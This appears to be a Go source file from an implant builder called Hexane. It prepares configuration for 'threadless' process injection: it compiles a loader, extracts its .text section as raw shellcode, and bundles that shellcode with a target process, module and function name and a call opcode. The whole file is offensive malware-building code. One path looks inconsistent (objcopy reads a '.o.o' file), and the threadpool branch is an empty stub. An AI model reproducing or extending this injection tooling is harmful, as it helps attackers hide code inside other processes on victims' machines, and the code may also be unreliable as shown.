package core

import (
	"fmt"
	"os"
)

func (h *HexaneConfig) GetInjectConfig() (*InjectConfig, error) {
	var (
		InjectCfg = new(InjectConfig)
		err       error
	)

	if h.Implant.Injection.Threadless != nil {
		var (
			loader []byte
			opcode = []byte{0xE8, 0x00, 0x00, 0x00, 0x00}
		)

		LoaderAsm := h.Compiler.BuildDirectory + "/threadless.asm"
		LoaderObj := h.Compiler.BuildDirectory + "/threadless.asm.o"
		LoaderData := h.Compiler.BuildDirectory + "/threadless.bin"

		Execute := h.Implant.Injection.Threadless.Execute
		InjectCfg.ExecuteObj = Execute + ".o"

		WrapMessage("DBG", fmt.Sprintf("generating execute object %s", Execute))
		if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{Execute}, h.Compiler.Flags, h.Compiler.IncludeDirs, nil, InjectCfg.ExecuteObj); err != nil {
			return nil, err
		}

		WrapMessage("DBG", "generating Threadless loader object")
		if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{LoaderAsm}, nil, h.Compiler.IncludeDirs, nil, LoaderObj); err != nil {
			return nil, err
		}

		WrapMessage("DBG", "extracting .text from loader object")
		if err = h.RunCommand(h.Compiler.Objcopy + " -j .text -O binary " + LoaderObj + ".o " + LoaderData); err != nil {
			return nil, err
		}

		WrapMessage("DBG", "extracting loader shellcode")
		if loader, err = os.ReadFile(LoaderData); err != nil {
			return nil, err
		}

		WrapMessage("DBG", "allocating injection strings config")
		InjectCfg.Strings = []string{
			h.Implant.Injection.Threadless.ProcName,
			h.Implant.Injection.Threadless.ModuleName,
			h.Implant.Injection.Threadless.FuncName,
			string(opcode),
			string(loader),
		}
	} else if h.Implant.Injection.Threadpool != nil {
		// TP
	}

	return InjectCfg, nil
}
